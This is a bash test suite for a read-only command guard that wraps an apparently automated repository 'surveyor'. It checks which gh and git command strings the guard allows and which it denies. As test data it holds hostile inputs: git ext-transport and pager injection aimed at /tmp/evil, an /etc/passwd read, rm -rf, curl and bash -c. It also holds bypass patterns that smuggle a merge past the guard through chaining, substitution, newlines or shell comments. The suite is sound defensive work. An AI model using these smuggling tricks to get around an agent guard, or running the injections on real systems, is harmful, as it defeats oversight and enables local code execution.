#!/usr/bin/env bash
#
# Self-test for forge-readonly-guard.sh.
#
# Proves both paths, because either alone is worthless: a guard that denies
# everything passes a prohibited-path test, and a guard that allows everything
# passes an intended-path test.
#
#   intended    the surveyor's measured read vocabulary is still accepted,
#               including the `--jq` expressions whose `|` and `>` are data
#   prohibited  create/edit/comment/review/merge/push/checkout/build and
#               arbitrary shell are denied — including when a denied command
#               rides behind an allowed one through chaining or substitution
#
# Self-contained: no network, no forge, no cluster. It only ever asks the guard
# to classify a string; nothing here executes the commands under test.
#
set -euo pipefail

HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
GUARD="$HERE/forge-readonly-guard.sh"

pass=0
fail=0

expect_allow() {
  local label=$1 cmd=$2 out status=0
  out=$("$GUARD" --command "$cmd" 2>&1) || status=$?
  if [ "$status" -eq 0 ]; then
    pass=$((pass + 1))
  else
    fail=$((fail + 1))
    printf 'FAIL  %s\n      expected allow, got exit %s: %s\n      command: %s\n' \
      "$label" "$status" "$out" "$cmd"
  fi
}

expect_deny() {
  local label=$1 cmd=$2 out status=0
  out=$("$GUARD" --command "$cmd" 2>&1) || status=$?
  if [ "$status" -eq 1 ]; then
    pass=$((pass + 1))
  else
    fail=$((fail + 1))
    printf 'FAIL  %s\n      expected deny (exit 1), got exit %s: %s\n      command: %s\n' \
      "$label" "$status" "$out" "$cmd"
  fi
}

# Deny AND name the component: "fail with the fix" is only true when the message
# points at the character to remove, not the whole word.
expect_deny_names() {
  local label=$1 cmd=$2 needle=$3 out status=0
  out=$("$GUARD" --command "$cmd" 2>&1) || status=$?
  if [ "$status" -eq 1 ] && [[ "$out" == *"$needle"* ]]; then
    pass=$((pass + 1))
  else
    fail=$((fail + 1))
    printf 'FAIL  %s\n      expected deny naming %s, got exit %s: %s\n      command: %s\n' \
      "$label" "$needle" "$status" "$out" "$cmd"
  fi
}

expect_usage() {
  local label=$1 status=0
  shift
  "$GUARD" "$@" >/dev/null 2>&1 || status=$?
  if [ "$status" -eq 2 ]; then
    pass=$((pass + 1))
  else
    fail=$((fail + 1))
    printf 'FAIL  %s\n      expected usage error (exit 2), got exit %s\n' "$label" "$status"
  fi
}

# GH_TELEMETRY must already be in the process environment: an env-prefixed
# command is denied, so argv cannot carry the disabling value. Existing gh
# cases below inherit this export and keep asserting their original reasons.
export GH_TELEMETRY=0

# ---------------------------------------------------------------------------
# Intended path — the surveyor's measured vocabulary
# ---------------------------------------------------------------------------

expect_allow 'pr view with a json field list' \
  "gh pr view 2786 --repo devantler-tech/monorepo --json number,state,headRefOid"
expect_allow 'pr list' "gh pr list --repo devantler-tech/platform --state open --limit 100"
expect_allow 'issue view' "gh issue view 108 --repo devantler-tech/agent-plugins --json body"

# The bare `--json` vocabulary probe. The surveyor's definition REQUIRES this
# diagnostic before any ad hoc JSON read — gh prints the subcommand's field list
# and exits nonzero without contacting the forge — so a guard that denies it
# makes the mandated discovery step unreachable and forces QUERY-UNKNOWN on every
# ad hoc read. It is admitted only as the FINAL word: with a value following, the
# ordinary field-list validation still applies.
expect_allow 'bare --json vocabulary probe on pr list' "gh pr list --json"
expect_allow 'bare --json vocabulary probe on pr view' "gh pr view --json"
expect_allow 'bare --json vocabulary probe on run list' "gh run list --json"
expect_allow 'bare --json vocabulary probe on issue list' "gh issue list --json"
expect_allow 'bare --json probe keeps preceding flags' \
  "gh pr view 2786 --repo devantler-tech/monorepo --json"
# Negative controls: the carve-out is trailing-`--json` ONLY. It must not admit a
# mutation riding behind the probe, nor widen any other value-taking flag.
expect_deny 'trailing --json does not license a chained mutation' \
  "gh pr list --json; gh pr merge 2786 --squash"
expect_deny 'trailing --json does not license redirection' "gh pr list --json > /tmp/v.json"
expect_deny 'a different value flag left bare is still denied' "gh pr list --repo"
expect_deny 'trailing --jq left bare is still denied' "gh pr list --json number --jq"
expect_deny 'the probe does not make a mutation verb readable' "gh pr merge --json"

# A value-taking flag must not swallow a flag-shaped word (#181). gh's parser does
# consume the next word as the value whatever it looks like, so `--repo --web` never
# opens a browser — but that inertness belongs to a downstream parser the guard does
# not assert. The guard classifies the word itself: consumed by a flag whose value
# grammar cannot begin with a dash, a flag-shaped word is denied by name.
expect_deny_names 'a value flag does not swallow --web (pr list --repo)' \
  "gh pr list --repo --web" "--web"
expect_deny_names 'a value flag does not swallow --web (pr list --state)' \
  "gh pr list --state --web" "--web"
expect_deny_names 'a value flag does not swallow --web (pr view --limit)' \
  "gh pr view 1 --limit --web" "--web"
expect_deny_names 'gh api --method does not swallow --web' \
  "gh api repos/devantler-tech/monorepo/pulls --method --web" "--web"
expect_deny_names 'gh api -H does not swallow --hostname' \
  "gh api repos/devantler-tech/monorepo/pulls -H --hostname" "--hostname"
expect_deny_names 'git --max-count does not swallow --work-tree' \
  "git log --oneline --max-count --work-tree" "--work-tree"
# The rule is per flag family, not a blanket ban on dash-leading values: a search
# expression, a jq program and a git grep pattern legitimately begin with a dash, and
# none of them can name a program, a host, or a file.
expect_allow 'a --search expression may begin with a dash' \
  "gh pr list --repo devantler-tech/platform --search -label:blocked --limit 10"
expect_allow 'a --jq program may begin with a dash' \
  "gh api repos/devantler-tech/platform/pulls --jq -1"
expect_allow 'a git --grep pattern may begin with a dash' \
  "git log --oneline --grep -x"
# A dash followed by a digit is a number, not a flag: git documents `--max-count -1`
# and `-n -1` as "no limit", and `--since -1.day` as a relative date. No flag name
# starts with a digit, so admitting these hides nothing the guard classifies.
expect_allow 'git --max-count takes a negative number' "git log --oneline --max-count -1"
expect_allow 'git -n takes a negative number' "git log --oneline -n -1"
expect_allow 'git --since takes a relative date beginning with a dash' \
  "git log --oneline --since -1.day"
expect_deny_names 'a negative number does not widen the rule to letters' \
  "git log --oneline --max-count -x --work-tree" "-x"
# git's pattern and date flags take free-form values that may begin with a dash:
# `--author -bot` is a regex over authors and `--since -yesterday` is an approxidate
# expression, both accepted by git as separated forms. A count is not free-form.
expect_allow 'git --author takes a dash-leading regex' "git log --oneline --author -bot"
expect_allow 'git --committer takes a dash-leading regex' "git log --oneline --committer -bot"
expect_allow 'git --since takes a dash-leading date expression' \
  "git log --oneline --since -yesterday"
expect_allow 'git --until takes a dash-leading date expression' \
  "git log --oneline --until -yesterday"
expect_allow 'issue list' "gh issue list --repo devantler-tech/ksail --state open --limit 200"
expect_allow 'search issues' "gh search issues --owner devantler-tech --state open --limit 300"
expect_allow 'search prs' "gh search prs --owner devantler-tech --state open"
# Both filters are prescribed by the surveyor definition this guard wraps: the
# maintainer-comment sweep keys on --commenter, and the merged-PR retrospective
# on --merged-at. Each only narrows the query server-side -- neither reaches a
# local file, a program, or a different host -- so denying them fails the run
# closed on a read the definition is told to perform.
expect_allow 'search issues filtered by commenter' \
  "gh search issues --owner devantler-tech --state open --commenter devantler --limit 300"
expect_allow 'search prs filtered by merge date' \
  "gh search prs --owner devantler-tech --merged --merged-at 2026-08-17..2026-08-20 --limit 100"
expect_allow 'repo list' "gh repo list devantler-tech --limit 100"
expect_allow 'run list' "gh run list --repo devantler-tech/platform --branch main --limit 40"
expect_allow 'run view' "gh run view 31544900207 --repo devantler-tech/platform --json jobs"
expect_allow 'pr checks' "gh pr checks 2786 --repo devantler-tech/monorepo"
expect_allow 'pr diff' "gh pr diff 2786 --repo devantler-tech/monorepo"
expect_allow 'label list' "gh label list --repo devantler-tech/monorepo"
expect_allow 'release view' "gh release view --repo devantler-tech/ksail"

expect_allow 'api rest get' "gh api repos/devantler-tech/monorepo/issues/2786/comments --paginate"
expect_allow 'api with an explicit GET method' \
  "gh api --method GET repos/devantler-tech/platform/rulesets"
expect_allow 'api with an attached GET method before the subcommand' \
  "gh --method=GET api repos/devantler-tech/platform/rulesets"
expect_allow 'bundled default-branch classifier is a guarded compound forge read' \
  "$HERE/classify-default-branch-ci-runs.sh --repo devantler-tech/platform --branch main --head-sha 0123456789abcdef0123456789abcdef01234567"
expect_allow 'api rate_limit with a jq object expression' \
  "gh api rate_limit --jq '{graphql:.resources.graphql,core:.resources.core}'"

# The point of the quote-aware scanner: these `|` and `>` are jq syntax, not
# shell syntax, and a naive split on `|` breaks every real survey query.
expect_allow 'jq expression containing a pipe' \
  "gh api repos/devantler-tech/monorepo/branches --paginate --jq '.[].name'"
expect_allow 'jq select with an inner pipe' \
  "gh pr list --repo devantler-tech/platform --json number,title --jq '.[]|select(.number>3000)|.title'"
expect_allow 'jq expression containing a greater-than' \
  "gh issue list --repo devantler-tech/ksail --json number --jq '.[]|select(.number > 100)'"

expect_allow 'piped through jq' \
  "gh api repos/devantler-tech/monorepo/pulls --paginate | jq -c 'add|map(.number)'"
expect_allow 'piped through grep' \
  "gh api repos/devantler-tech/monorepo/branches --jq '.[].name' | grep -E '^(claude|cursor|codex)/'"
expect_allow 'piped through sort and head' "gh repo list devantler-tech | sort | head -20"
expect_allow 'a plain sed substitution' "gh pr list --json number --jq '.[]|@tsv' | sed 's/^/pr\t/'"
expect_allow 'sed with -n and a print command' "gh pr list --json number | sed -n '1p'"
expect_allow 'a longer read pipeline' \
  "gh api repos/devantler-tech/platform/pulls --paginate --jq '.[].head.ref' | sort | uniq | wc -l"

expect_allow 'git log' "git -C libraries/agent-plugins log --oneline -5"
expect_allow 'git status' "git -c core.fsmonitor= --no-optional-locks status --porcelain"
expect_allow 'git rev-parse' "git rev-parse HEAD"
# `log` reaches neither mechanism without a patch flag: it computes no patch and
# refreshes no index, so it carries no suppression at all. That is the everyday
# path the two requirements are kept away from.
expect_allow 'git log needs no suppression without a patch flag' "git log --oneline -20"
expect_allow 'git log --stat computes no external patch' "git log --stat -5"
# A patch-producing read does pay the cost, in its fully suppressed form.
expect_allow 'git show of a blob, suppressed' "git show --no-ext-diff --no-textconv HEAD:AGENTS.md"
# `diff` pays BOTH costs: it produces a patch and refreshes the index.
expect_allow 'git diff, suppressed' \
  "git -c core.fsmonitor= --no-optional-locks diff --no-ext-diff --no-textconv HEAD~1"
expect_allow 'git ls-files, suppressed' "git -c core.fsmonitor= --no-optional-locks ls-files"
expect_allow 'the suppression survives -C' \
  "git -C libraries/agent-plugins -c core.fsmonitor= --no-optional-locks status --porcelain"
expect_allow 'git log -p, suppressed' "git log -p --no-ext-diff --no-textconv -3"

# GraphQL is the one read the surveyor cannot do over GET: reviewThreads is a
# GraphQL-only field, so a guard that refused every POST would break it.
expect_allow 'graphql query for review threads' \
  "gh api graphql -f query='query(\$o:String!){repository(owner:\$o){name}}'"
expect_allow 'anonymous graphql document is a query by spec' \
  "gh api graphql -f query='{ viewer { login } }'"
expect_allow 'graphql reviewThreads pagination' \
  "gh api graphql -F n=2786 -f query='query{repository{pullRequest{reviewThreads(first:100){nodes{isResolved}}}}}'"

# The surveyor's real paginated thread sweep, verbatim, and the mutation that is
# structurally identical to it. The pair is the sharpest test in the suite: both
# are `gh api graphql` POSTs carrying multiple -F variables and a --jq filter, so
# nothing but the operation type separates the read the survey depends on from
# the write it must never make.
expect_allow 'the surveyor real multi-variable paginated query' \
  "gh api graphql -F owner=devantler-tech -F name=monorepo -F number=2786 -f query='query(\$owner:String!,\$name:String!,\$number:Int!,\$cursor:String){repository(owner:\$owner,name:\$name){pullRequest(number:\$number){reviewThreads(first:100,after:\$cursor){pageInfo{hasNextPage endCursor} nodes{isResolved path}}}}}' --jq '.data.repository.pullRequest.reviewThreads.nodes[]|select(.isResolved==false)|.path'"
expect_deny 'the structurally identical resolve mutation' \
  "gh api graphql -F id=PRRT_abc -f query='mutation(\$id:ID!){resolveReviewThread(input:{threadId:\$id}){thread{isResolved}}}' --jq '.data.resolveReviewThread.thread.isResolved'"

# ---------------------------------------------------------------------------
# Prohibited path — every mutation the surveyor must never make
# ---------------------------------------------------------------------------

expect_deny 'pr merge' "gh pr merge 2786 --repo devantler-tech/monorepo --squash"
expect_deny 'pr create' "gh pr create --draft --title x --body y"
expect_deny 'pr comment' "gh pr comment 2786 --body 'looks good'"
expect_deny 'pr edit' "gh pr edit 2786 --add-label security"
expect_deny 'pr review' "gh pr review 2786 --approve"
expect_deny 'pr ready' "gh pr ready 2786"
expect_deny 'pr close' "gh pr close 2786"
expect_deny 'issue create' "gh issue create --title x --body y"
expect_deny 'issue edit' "gh issue edit 108 --add-assignee devantler"
expect_deny 'issue comment' "gh issue comment 108 --body x"
expect_deny 'issue close' "gh issue close 108"
expect_deny 'repo clone' "gh repo clone devantler-tech/platform"
expect_deny 'repo delete' "gh repo delete devantler-tech/platform"
expect_deny 'run rerun' "gh run rerun 31544900207"
expect_deny 'classifier cannot read an arbitrary local fixture under the survey guard' \
  "$HERE/classify-default-branch-ci-runs.sh --input /tmp/runs.json"
expect_deny 'classifier rejects an unscoped repository value' \
  "$HERE/classify-default-branch-ci-runs.sh --repo example.com/devantler-tech/platform --branch main --head-sha 0123456789abcdef0123456789abcdef01234567"
expect_deny 'run cancel' "gh run cancel 31544900207"
expect_deny 'workflow run' "gh workflow run cd.yaml"
expect_deny 'release create' "gh release create v1.0.0"
expect_deny 'secret set' "gh secret set KUBE_CONFIG"
expect_deny 'auth token' "gh auth token"
expect_deny 'label create' "gh label create x"
expect_deny 'gh with no subcommand' "gh"

expect_deny 'api explicit POST' \
  "gh api --method POST repos/devantler-tech/monorepo/issues/2786/comments"
expect_deny 'api short-flag POST' "gh api -X POST repos/devantler-tech/monorepo/issues"
expect_deny 'api DELETE' "gh api --method DELETE repos/devantler-tech/monorepo/issues/1/labels"
expect_deny 'api PATCH' "gh api --method PATCH repos/devantler-tech/monorepo/issues/1"
expect_deny 'api PUT' "gh api --method PUT repos/devantler-tech/monorepo/pulls/1/merge"
expect_deny 'api lowercase post' "gh api --method post repos/devantler-tech/monorepo/issues"
expect_deny 'api prefix method cannot bypass classification' \
  "gh --method=PUT api user/starred/devantler-tech/agent-plugins"
expect_deny 'api prefix input cannot bypass classification' \
  "gh --input=/etc/passwd api markdown/raw"
expect_deny 'api prefix hostname cannot bypass classification' \
  "gh --hostname=example.com api rate_limit"
# gh makes the request a POST as soon as a field is set, with no --method in sight.
expect_deny 'api field argument implies POST' \
  "gh api repos/devantler-tech/monorepo/issues/2786/comments -f body=hi"
expect_deny 'api raw-field implies POST' \
  "gh api repos/devantler-tech/monorepo/issues/2786/comments -F body=@x"
expect_deny 'api --input implies POST' \
  "gh api repos/devantler-tech/monorepo/issues --input payload.json"

# --- #144: fields are a GET query string when an explicit GET method is present ---
# `gh api --help`: parameters switch the method to POST "unless --method GET is given",
# in which case they are serialised into the query string. Both reads below are
# prescribed by the surveyor definition, so denying them would remove the
# active-work signal and the issue census.
expect_allow 'api -X GET with a field is a query-string read' \
  "gh api -X GET repos/devantler-tech/monorepo/activity -f per_page=100"
expect_allow 'api --method GET with a field is a query-string read' \
  "gh api --method GET repos/devantler-tech/monorepo/activity -f per_page=100"
expect_allow 'api -X GET with a field and a ref value' \
  "gh api -X GET repos/devantler-tech/monorepo/activity -f per_page=100 -f ref=refs/heads/main"
expect_allow 'api GET method is matched case-insensitively' \
  "gh api -X get repos/devantler-tech/monorepo/activity -f per_page=100"
expect_allow 'api -X GET with a long raw-field' \
  "gh api -X GET search/issues --raw-field q=org:devantler-tech"
expect_allow 'api -X GET with a typed field' \
  "gh api -X GET search/issues -F per_page=100"
expect_allow 'api --method get with the long field form' \
  "gh api --method get search/issues --field per_page=100"
expect_allow 'api -X GET with the long field form' \
  "gh api -X GET search/issues --field per_page=100"
expect_allow 'api -X GET issue census with pagination' \
  "gh api -X GET search/issues -f q=org:devantler-tech --paginate"

# The widening is scoped to the METHOD. Every adjacent protection is independent
# and must survive it.
expect_deny 'api field with no method still implies POST' \
  "gh api repos/devantler-tech/monorepo/issues/2786/comments -f body=hi"
expect_deny 'api field under an explicit POST stays denied' \
  "gh api -X POST repos/devantler-tech/monorepo/issues/2786/comments -f body=hi"
expect_deny 'api field under an explicit PATCH stays denied' \
  "gh api --method PATCH repos/devantler-tech/monorepo/issues/2786 -f state=closed"
expect_deny 'api -X GET does not widen the @file read' \
  "gh api -X GET repos/devantler-tech/monorepo/issues -F body=@secret.txt"
expect_deny 'api -X GET does not widen the bare @file read' \
  "gh api -X GET repos/devantler-tech/monorepo/issues -f @secret.txt"
expect_deny 'api -X GET does not widen --input' \
  "gh api -X GET repos/devantler-tech/monorepo/issues --input payload.json"
expect_deny 'api with no endpoint' "gh api --paginate"

expect_deny 'graphql mutation' \
  "gh api graphql -f query='mutation{resolveReviewThread(input:{threadId:\"x\"}){thread{id}}}'"
expect_deny 'graphql mutation in mixed case' "gh api graphql -f query='Mutation { addComment }'"
expect_deny 'graphql subscription' "gh api graphql -f query='subscription{events{id}}'"

expect_deny 'git push' "git push origin main"
expect_deny 'git commit' "git commit -m x"
expect_deny 'git checkout of a branch' "git checkout claude/some-branch"
expect_deny 'git reset' "git reset --hard origin/main"
expect_deny 'git fetch' "git fetch origin"
expect_deny 'git -C then push' "git -C libraries/agent-plugins push origin HEAD"
expect_deny 'git with no subcommand' "git"

# The whole reason the scanner exists: a denied command riding behind an allowed
# one. Each of these begins with a perfectly legitimate read.
expect_deny 'semicolon chaining' "gh pr list --json number; gh pr merge 2786 --squash"
expect_deny 'and-and chaining' "gh pr list --json number && gh pr merge 2786 --squash"
expect_deny 'or-or chaining' "gh pr list --json number || gh pr merge 2786 --squash"
expect_deny 'backgrounding' "gh pr merge 2786 --squash &"
expect_deny 'command substitution' "gh pr view \$(gh pr merge 2786 --squash)"
expect_deny 'backtick substitution' "gh pr view \`gh pr merge 2786 --squash\`"
expect_deny 'substitution inside double quotes' "gh pr view --json \"\$(gh pr merge 2786)\""
expect_deny 'process substitution' "gh pr list --json number < <(gh pr merge 2786)"
expect_deny 'output redirection' "gh pr list --json number > /tmp/out.json"
expect_deny 'append redirection' "gh pr list --json number >> /tmp/out.json"

# Redirection that provably creates no file. Refusing these denied 17 of 120
# measured surveyor commands, none of which writes anything: merging stderr and
# silencing stderr are read idioms, not writes.
expect_allow 'stderr merged into stdout' "gh pr list --json number 2>&1"
expect_allow 'stderr to the null device' "gh pr list --json number 2>/dev/null"
expect_allow 'null device with a space' "gh pr list --json number 2> /dev/null"
expect_allow 'stdout to the null device' "gh pr list --json number >/dev/null"
expect_allow 'stdout duplicated onto stderr' "gh pr list --json number 1>&2"
expect_allow 'consumed redirect mid-pipeline' "gh api x --jq .b 2>/dev/null | grep -c foo"
# The fd prefix is not an argument, but a digit-suffixed OPERAND is. Eating the
# wrong one would silently change the argv Layer 2 classifies.
expect_allow 'operand digits survive the fd strip' "gh pr view 163 --repo o/r --json body 2>/dev/null"
expect_allow 'multi-digit fd word is stripped whole' "gh api x --jq .a | head -5 2>/dev/null"
expect_allow 'digit-suffixed flag is not an fd' "gh api x --jq .a | head -52>/dev/null"
# Layer 2 must still see the argv after a redirect is consumed.
expect_deny 'bad flag survives a consumed redirect' "gh api x --jq .a | head -z 2>/dev/null"
expect_deny 'bad subcommand survives a consumed redirect' "gh nonsense list 2>/dev/null"
expect_deny 'write verb survives a consumed redirect' "gh pr merge 1 --repo o/r --squash 2>/dev/null"
# Everything that can NAME a file still denies.
expect_deny 'stderr to a real file' "gh pr list --json number 2> /tmp/err.log"
expect_deny '>&word is &>word and writes a file' "gh pr list --json number >&/tmp/x"
expect_deny 'closing a descriptor is not a read' "gh pr list --json number >&-"
# These separate the two >& conjuncts. Without the word-boundary check `>&1x`
# passes as a duplication though bash writes a file named `1x`; without the
# digit-run check `>& /tmp/x` passes though it is `&> /tmp/x`.
expect_deny 'fd duplication needs a word boundary' "gh pr list --json number >&1x"
expect_deny 'digits then a path is still a file' "gh pr list --json number >&12/tmp/x"
expect_deny 'bare >& with a space is &>' "gh pr list --json number >& /tmp/x"
# A newline is a word boundary too, so a consumed redirect must hand the scanner
# back to the newline rule rather than swallowing it into the redirect target.
expect_deny 'newline after a duplicated descriptor' "gh pr list --json number 2>&1
gh pr merge 1 --squash"
expect_deny 'newline after the null device' "gh pr list --json number 2>/dev/null
gh pr merge 1 --squash"
expect_deny 'chaining after the null device' "gh pr list --json number 2>/dev/null;gh pr merge 1 --squash"
expect_deny 'chaining after a duplicated descriptor' "gh pr list --json number 2>&1&&gh pr merge 1"
expect_deny 'a file redirect after a duplication' "gh pr list --json number 2>&1>/tmp/x"
expect_deny 'input redirect after the null device' "gh pr list --json number 2>/dev/null<f"
expect_deny 'a second redirect can still name a file' "gh pr list --json number >/dev/null 2>/tmp/x"
expect_deny 'null-device prefix is not the null device' "gh pr list --json number 2>/dev/nullx"
expect_deny 'null-device prefix on stdout' "gh pr list --json number > /dev/nullx"
expect_deny 'input redirection' "gh api repos/x/y/issues < payload.json"
expect_deny 'a newline carrying a second command' "gh pr list --json number
gh pr merge 2786 --squash"
expect_deny 'a mutation later in the pipeline' "gh pr list --json number | gh pr merge 2786"
expect_deny 'a non-allowlisted program in the pipeline' "gh pr list --json number | tee /tmp/x"

expect_deny 'arbitrary shell' "bash -c 'gh pr merge 2786 --squash'"
expect_deny 'sh' "sh -c 'echo hi'"
expect_deny 'curl' "curl https://example.com"
expect_deny 'rm' "rm -rf /tmp/x"
expect_deny 'a build command' "go build ./..."
expect_deny 'npm install' "npm ci"
expect_deny 'an env-prefixed command' "GH_TOKEN=x gh pr list --json number"

# awk and in-place sed can write without any shell redirection at all.
expect_deny 'awk is not allowlisted' "gh pr list --json number | awk '{print > \"/tmp/x\"}'"
expect_deny 'sed in place' "sed -i 's/a/b/' AGENTS.md"
expect_deny 'sed in place with a suffix' "sed -i.bak 's/a/b/' AGENTS.md"
expect_deny 'sed write flag' "gh pr list --json number | sed 's/a/b/w /tmp/out'"
expect_deny 'sed execute flag' "gh pr list --json number | sed 's/a/b/e'"
expect_deny 'sed script from a file' "gh pr list --json number | sed -f script.sed"
expect_deny 'sed -e with a write flag' "gh pr list --json number | sed -e 's/a/b/w /tmp/out'"

expect_deny 'unbalanced quoting' "gh pr list --json 'number"
expect_deny 'a stray leading pipe' "| gh pr list --json number"

# --- Regressions: every one of these was ALLOWED before review ---------------
#
# A method flag whose value a raw-text regex cannot see reads as "no method
# given", which is indistinguishable from a GET.
expect_deny 'quoted method value' "gh api --method 'POST' repos/devantler-tech/monorepo/issues"
expect_deny 'attached long method' "gh api --method=POST repos/devantler-tech/monorepo/issues"
expect_deny 'attached short method' "gh api -XPOST repos/devantler-tech/monorepo/issues"
expect_deny 'attached short DELETE' "gh api -XDELETE repos/devantler-tech/monorepo/issues/1"
expect_deny 'method flag with no value' "gh api --method repos/devantler-tech/monorepo/issues"
expect_allow 'quoted GET is still a read' "gh api --method 'GET' repos/devantler-tech/monorepo/pulls"
expect_allow 'attached GET is still a read' "gh api -XGET repos/devantler-tech/monorepo/pulls"

# git options that turn a read into local execution.
expect_deny 'git ext transport' "git -c protocol.ext.allow=always ls-remote 'ext::sh -c whoami'"
expect_deny 'git upload-pack override' "git ls-remote --upload-pack=/tmp/evil origin"
expect_deny 'git receive-pack override' "git ls-remote --receive-pack=/tmp/evil origin"
expect_deny 'git -c config injection' "git -c core.pager=/tmp/evil log"
expect_deny 'git --config-env' "git --config-env=core.pager=EVIL log"
expect_deny 'git --exec-path' "git --exec-path=/tmp/evil log"
expect_allow 'git -C is still fine' "git -C libraries/agent-plugins log --oneline -5"

# A verb that contacts a remote is denied on the verb alone, because argv never
# shows where a named remote points: git resolves `remote.<name>.url` from
# configuration after parsing, so `origin` may be an `ext::` transport that
# executes a local command. These are the forms whose danger is invisible in the
# command line, which is why excluding the verb is the only sound answer.
expect_deny 'ls-remote with a named remote' "git ls-remote origin"
expect_deny 'ls-remote with a named remote and -C' "git -C libraries/agent-plugins ls-remote origin"
expect_deny 'ls-remote --heads with a named remote' "git ls-remote --heads origin"
expect_deny 'ls-remote with an explicit URL' "git ls-remote https://github.com/devantler-tech/monorepo.git"
expect_deny 'git fetch' "git fetch origin main"
expect_deny 'git clone' "git clone https://github.com/devantler-tech/monorepo.git"
expect_deny 'git remote get-url' "git remote get-url origin"
expect_deny 'git submodule update' "git submodule update --init libraries/agent-plugins"

# Options whose program comes from repository CONFIGURATION rather than argv. The
# flags above name a program in the command line; these do not, so the guard
# cannot see them at all — it either refuses the request to page, or requires the
# flag that switches the mechanism off.
expect_deny 'git --paginate runs core.pager' "git --paginate log --oneline -5"
# These carry the fsmonitor suppression so the PATCH rule is the one that fires;
# without it they would deny on the index-refresh rule instead and prove nothing
# about the mechanism named in the label.
expect_deny 'git diff without --no-ext-diff runs diff.external' \
  "git -c core.fsmonitor= --no-optional-locks diff HEAD~1"
expect_deny 'git diff with only --no-ext-diff still runs textconv' \
  "git -c core.fsmonitor= --no-optional-locks diff --no-ext-diff HEAD~1"

# core.fsmonitor names a HOOK PROGRAM that a plain index-refreshing read runs
# before producing any output. Measured on git 2.50.1 with a dirty worktree.
expect_deny 'git status runs a configured fsmonitor hook' "git status --porcelain"
expect_deny 'git ls-files runs a configured fsmonitor hook' "git ls-files"
expect_deny 'git diff refreshes the index even when fully patch-suppressed' \
  "git diff --no-ext-diff --no-textconv HEAD~1"
# The carve-out is the empty value ONLY: every other assignment ADDS an
# execution path, and this one installs the very hook being suppressed.
expect_deny 'a -c that SETS fsmonitor is still denied' \
  "git -c core.fsmonitor=/tmp/evil status --porcelain"
expect_deny 'a near-miss fsmonitor value is not the suppression' \
  "git -c core.fsmonitor=false status --porcelain"
expect_deny 'the carve-out does not admit any other -c assignment' \
  "git -c core.pager=/tmp/evil status --porcelain"
# The three above would also deny for a MISSING suppression, so each leaves the
# -c rule untested. Here the suppression IS present and satisfies the
# requirement, so only the -c denial can reject the second assignment.
expect_deny 'a second -c rides alongside a satisfied suppression' \
  "git -c core.fsmonitor= -c core.pager=/tmp/evil status --porcelain"
# The assignment means something only as a `-c` PAIR. On its own the same text
# is an ordinary pathspec operand that configures nothing, so a requirement
# matched by mere presence would be satisfied by a word git ignores.
expect_deny 'the bare value as a pathspec does not satisfy the requirement' \
  "git status --porcelain core.fsmonitor="

# --- Bypasses that reached a classification the shell would not have produced ---

# An unset positional expands to NOTHING and splices the words either side
# together, so the classifier and the shell disagree about the whole argument.
# `${9}` already failed check_expansion; the unbraced form never reached it.
# shellcheck disable=SC2016  # the unexpanded characters ARE the input under test
expect_deny 'an unbraced positional parameter splices a mutation together' \
  'gh api graphql -f query=muta$9tion{x}'
# shellcheck disable=SC2016  # the unexpanded characters ARE the input under test
expect_deny 'a special parameter is rewritten the same way' \
  'gh api graphql -f query=muta$@tion{x}'
# shellcheck disable=SC2016  # the unexpanded characters ARE the input under test
expect_allow 'a named parameter expansion stays allowed, as documented' \
  'git -C $REPO log --oneline -5'

# An unquoted `#` starts a comment, so every word after it is discarded — which
# would let a command satisfy a required-flag check with flags that never run.
expect_deny 'a shell comment fakes the patch suppression' \
  "git show HEAD # --no-ext-diff --no-textconv"
expect_deny 'a shell comment hides a denied verb behind an allowed one' \
  "gh pr list --repo devantler-tech/monorepo # gh pr merge 1"
expect_allow 'a # inside quotes is data, not a comment' \
  "gh api repos/devantler-tech/monorepo/issues --jq '.[]|\"#\\(.number)\"'"
expect_allow 'a mid-word # is not a comment' \
  "gh api repos/devantler-tech/monorepo/labels/bug#1"

# Patch flags arrive attached too, and an exact-word scan cannot see them.
# `-p` means something else on a verb that cannot produce a patch, and inferring
# one there denies a legitimate read with a remedy that cannot work — `cat-file`
# rejects `--no-ext-diff`. Only log/diff/show infer a patch from a flag.
expect_allow 'git cat-file -p is pretty-print, not a patch' "git cat-file -p HEAD:AGENTS.md"
expect_allow 'git rev-list -1 is a count, not a patch' "git rev-list -1 HEAD"
expect_allow 'git describe takes no patch' "git describe --tags"
expect_deny 'an attached patch flag cluster still produces a patch' "git log -pU3 -1"
expect_deny 'a unified-context flag implies a patch' "git log -U3 -1"
expect_allow 'the attached form is fine once suppressed' \
  "git log -pU3 -1 --no-ext-diff --no-textconv"

# %G asks git to verify a signature, which runs the configured gpg.program — a
# third config-named execution path, independent of the diff drivers.
expect_deny 'a %G placeholder runs the configured gpg.program' \
  "git -c core.fsmonitor= --no-optional-locks log --format=%G? -1"
expect_deny 'the same placeholder in a separated --pretty value' \
  "git log --pretty %G? -1"
expect_allow 'an ordinary format placeholder is untouched' "git log --format=%H -1"

# Scanning argv for a literal %G is not enough: a format NAME resolves through
# `pretty.<name>` in repository configuration, so the placeholder never appears
# in the command. Built-ins are safe because git ignores a config entry that
# shadows one; anything else is an unreadable lookup.
expect_deny 'a --pretty NAME is a configuration lookup the guard cannot read' \
  "git -c core.fsmonitor= --no-optional-locks log --pretty=evil -1"
expect_deny 'the same lookup in a separated value' \
  "git -c core.fsmonitor= --no-optional-locks log --pretty evil -1"
expect_deny 'and in --format spelling' \
  "git -c core.fsmonitor= --no-optional-locks log --format=evil -1"
expect_allow 'a built-in format name still passes' \
  "git -c core.fsmonitor= --no-optional-locks log --pretty=oneline -1"
expect_allow 'an explicit format: string still passes' \
  "git -c core.fsmonitor= --no-optional-locks log --pretty=format:%h%d -5"

# `--work-tree` repoints git at a directory the guard never scoped while the
# surveyed repository still supplies the index, so an allowed `diff` prints
# whatever the caller aims it at. `-C` reaches another repository without
# detaching the tree from its own repository, so the vocabulary keeps working.
expect_deny 'an alternate work tree turns an allowed diff into an arbitrary file read' \
  "git --git-dir=/tmp/other/.git --work-tree=/tmp/other -c core.fsmonitor= --no-optional-locks diff --no-ext-diff --no-textconv"
expect_deny 'the separated spelling too' \
  "git --work-tree /tmp/other -c core.fsmonitor= --no-optional-locks status --porcelain"
expect_allow '-C still reaches another repository' \
  "git -C applications/ksail -c core.fsmonitor= --no-optional-locks log --oneline -1"

# `status --verbose` prints a staged patch, so it reaches diff.external and the
# textconv drivers exactly as `diff` does — but status is not a patch verb and
# --verbose is not a patch flag, so neither rule demanded the suppression.
